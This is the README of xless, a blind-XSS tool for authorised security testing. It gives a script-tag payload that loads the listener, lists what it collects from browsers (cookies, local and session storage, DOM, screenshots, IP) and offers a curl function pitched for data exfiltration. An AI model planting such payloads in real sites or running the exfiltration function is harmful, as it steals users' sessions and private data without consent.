<h1 align="center">
  <br>
  <a href="https://github.com/mazen160/xless"><img src="https://user-images.githubusercontent.com/29874489/58731472-4f6c8080-83de-11e9-8206-992f4d777fdc.png" alt="Xless"></a>
  <br>
  xless
  <br>
</h1>

<h4 align="center">The Serverless Blind XSS App</h4>

<p align="center">
  <img src="https://img.shields.io/maintenance/yes/2021.svg?style=flat-square" alt="Maintained" />
  <img src="https://img.shields.io/bitbucket/issues-raw/mazen160/xless.svg?style=flat-square" alt="Issues" />
  <img src="https://img.shields.io/github/last-commit/mazen160/xless.svg?style=flat-square" alt="Last Commit" />
</p>

## :information_source: About The Project
**Xless** is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.
There is no need to run a full deployment process; just setup a [vercel.com](https://vercel.com/) account and run `bash deploy.sh`.
That's it. You now have a fully-running Blind XSS listener that uses Slack to notify you for callbacks.

## :warning: Requirements
* [vercel.com](https://vercel.com/) account: Vercel provides a **free plan** for serverless. If you use another provider for serverless, code changes should be minimal.
* Slack Incoming Webhook URL.
* IMGBB (free) Account and API key - for the screenshots.


## :rocket: Deployment
1. Run `bash deploy.sh`

```bash
$ bash deploy.sh

> Deploying ~/xless under X
> https://custom-xless-deployment.vercel.app [v2] [in clipboard] [4s]
> Success! Deployment ready [4s]
```
2. Use the URL for blind XSS testing :fire:

**Xless will automatically serve the XSS payload, collect information, and exfiltrate it into your serverless app, which is then sent right to you in Slack.**


## :speech_balloon: Example Payload

```html
<script src="https://custom-xless-deployment.vercel.app"></script>
```


## :eyes: Demo
![Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot.png)


## :incoming_envelope: Collected Data

* Cookies
* User-Agent
* HTTP Referrer
* Browser DOM
* Browser Time
* Document Location
* Origin
* LocalStorage
* SessionStorage
* IP Address
* Screenshot

## :satellite: Out-of-Band (OOB) Callbacks Listener

Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS requests. Any HTTP GET request that is sent to non-parent path will be alerted.

## :eyes: Demo

```bash
$ curl https://custom-xless-deployment.vercel.app/callback-canary
```

![OOB CallBack Listener Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot-oob-callback-example.png)

Or anything random, such as:

```bash
$ curl https://custom-xless-deployment.vercel.app/88bf0ecd
```


## :man_health_worker: Health Check
Xless provides a `/health` endpoint to let you know that everything is configured correctly.
The current tests are the existence of the API keys and a successful image upload to IMGBB.

## :books: Request History API
`GET /xless-history` returns captured requests as paginated JSON (latest 10, newest-first; paginate via `_links.next`), authenticated with `Authorization: Bearer $XLESS_HISTORY_API_TOKEN`. Captured requests are persisted to a private [Vercel Blob](https://vercel.com/docs/vercel-blob) store.

**Free-tier capacity:** each captured request is one Blob write (one *Advanced Operation*), and Vercel's Hobby plan includes 10,000 Advanced Operations/month — so Xless captures up to **~10,000 incoming requests per month** for free (history reads not counted). Records are small (screenshots are stored as imgbb URLs), so the 5 GB storage limit is not the bottleneck.

## :robot: MCP Server
An [MCP](https://modelcontextprotocol.io/) server is exposed at `/xless-mcp` over the [Streamable HTTP transport](https://modelcontextprotocol.io/docs/concepts/transports#streamable-http), so AI agents can read the captured history as tools. It is stateless (serverless-friendly) and authenticated with the same `Authorization: Bearer $XLESS_HISTORY_API_TOKEN` as the history API.

Tools:
* `list_requests` — latest captured requests, newest-first (`limit`, default 10; `cursor`; optional `type`).
* `get_request` — a single captured request by `id`.

Connect any MCP client (e.g. Cursor) to your deployment:

```json
{
  "mcpServers": {
    "xless": {
      "url": "https://custom-xless-deployment.vercel.app/xless-mcp",
      "headers": { "Authorization": "Bearer <XLESS_HISTORY_API_TOKEN>" }
    }
  }
}
```

##  Example Blind XSS payloads

You can view a number of handy XSS payloads for your xless app at `$URL/examples`
* URL: `https://custom-xless-deployment.vercel.app/examples`
Once you deploy your app, you can find the examples there.

## :envelope_with_arrow: Scriptable Messages

You can use Xless to send direct messages to your listener. It can be useful in data exfiltration or as a scriptable way to send messages and alerts to your Slack app.

```shell
# on your (bashrc / zshrch) file:
function xless() {
  curl -s https://custom-xless-deployment.vercel.app/message --data "text=$1"
}
```


## Contribution
Contribution is very welcome. Please share your ideas by Github issues and pull requests.

Here are some ideas to start with:
1. ~~Enabling sharing of page screenshot~~.
2. ~~Scriptable message~~.
3. _Your idea of a new feature_?


## Acknowledgement

* [Matthew Bryant](https://github.com/mandatoryprogrammer) for the XSS Hunter project.
* [Rami Ahmed](https://twitter.com/rami_ahmad) for the "xless" name idea.
* [Damian Ebelties](https://twitter.com/DamianEbelties) for the logo.
* [Rotem Reiss](https://twitter.com/2rs3c) for the screenshot feature.
* [Vercel.com](https://vercel.com/) for operating a great serverless platform.

## Awesome Similar Projects

* [Azure-xless](https://github.com/dgoumans/Azure-xless): An Xless implementation for Microsoft Azure Function by [Daan Goumans](https://twitter.com/daangoumans).


## Legal Disclaimer
This project is made for educational and ethical testing purposes only. Usage of xless for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


## License
The project is currently licensed under MIT License.

## Author
*Mazin Ahmed*
* Website: [https://mazinahmed.net](https://mazinahmed.net)
* Email: mazin [at] mazinahmed [dot] net
* Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
* Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
